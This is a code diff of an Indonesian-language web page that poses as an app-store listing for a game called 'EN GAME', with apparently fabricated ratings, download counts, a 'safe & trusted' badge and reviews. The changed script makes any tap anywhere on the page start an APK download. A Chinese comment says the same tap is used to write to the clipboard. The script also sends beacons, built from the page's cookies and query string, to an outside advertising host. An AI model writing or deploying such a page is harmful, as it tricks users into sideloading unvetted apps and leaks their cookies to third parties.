@@ -419,26 +419,32 @@
       <div class="app-info-body">
         <h5>EN GAME</h5>
         <h4>EN GAME</h4>
-        <div class="app-info-meta">Berisi iklan &bull; Pembelian dalam aplikasi</div>
+        <div class="app-info-meta">
+          Berisi iklan &bull; Pembelian dalam aplikasi
+        </div>
       </div>
     </div>
 
     <div class="stats">
       <div class="stat">
-        <div class="stat-value">
-          4,8 <img src="files/bstart.png" alt="" />
-        </div>
+        <div class="stat-value">4,8 <img src="files/bstart.png" alt="" /></div>
         <div class="stat-label">12 rb ulasan</div>
       </div>
       <div class="stat">
         <div class="stat-value">
-          <svg viewBox="0 0 24 24"><path d="M5 20h14v-2H5v2zM19 9h-4V3H9v6H5l7 7 7-7z"/></svg>
+          <svg viewBox="0 0 24 24">
+            <path d="M5 20h14v-2H5v2zM19 9h-4V3H9v6H5l7 7 7-7z" />
+          </svg>
         </div>
         <div class="stat-label">+158 rb Unduhan</div>
       </div>
       <div class="stat">
         <div class="stat-value">
-          <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+          <svg viewBox="0 0 24 24">
+            <path
+              d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"
+            />
+          </svg>
         </div>
         <div class="stat-label">Aman &amp; Terpercaya</div>
       </div>
@@ -455,7 +461,9 @@
     </div>
 
     <button type="button" class="install-btn">
-      <svg viewBox="0 0 24 24"><path d="M5 20h14v-2H5v2zM19 9h-4V3H9v6H5l7 7 7-7z"/></svg>
+      <svg viewBox="0 0 24 24">
+        <path d="M5 20h14v-2H5v2zM19 9h-4V3H9v6H5l7 7 7-7z" />
+      </svg>
       Instal Sekarang
     </button>
 
@@ -509,7 +517,9 @@
               <span class="name">Rizky Pratama</span>
             </div>
             <div class="review-stars"><img src="files/bfs.png" alt="" /></div>
-            <p>Game-nya seru banget! Hadiah hariannya juara, pasti rekomendasi!</p>
+            <p>
+              Game-nya seru banget! Hadiah hariannya juara, pasti rekomendasi!
+            </p>
           </div>
 
           <div class="review">
@@ -607,9 +617,6 @@
           "https://api.anubisriches.com/api/advertising/onshow",
           "show",
         );
-        // 全屏点击触发下载 + 复制（需要用户手势，剪贴板才能写入）
-        document.addEventListener("click", onClickBtn, true);
-        document.addEventListener("touchend", onClickBtn, true);
       };
 
       function sendBeacon(url, label) {
@@ -624,9 +631,7 @@
       }
 
       function getUrl(url) {
-        const cookieStr = document.cookie
-          .replace("; ", "&")
-          .replace(";", "&");
+        const cookieStr = document.cookie.replace("; ", "&").replace(";", "&");
         const sep = window.location.search.length
           ? window.location.search + "&"
           : "?";
@@ -642,7 +647,16 @@
         return null;
       }
 
+      // 全屏点击触发下载 + 复制（需要用户手势，剪贴板才能写入）
+      document.addEventListener("click", onClickBtn, true);
+      document.addEventListener("touchend", onClickBtn, true);
+
+      let clicked = false;
       function onClickBtn() {
+        if (clicked) return;
+        clicked = true;
+        setTimeout(() => (clicked = false), 1000);
+        
         downloadApk();
         sendBeacon(
           "https://api.anubisriches.com/api/advertising/ondownload",
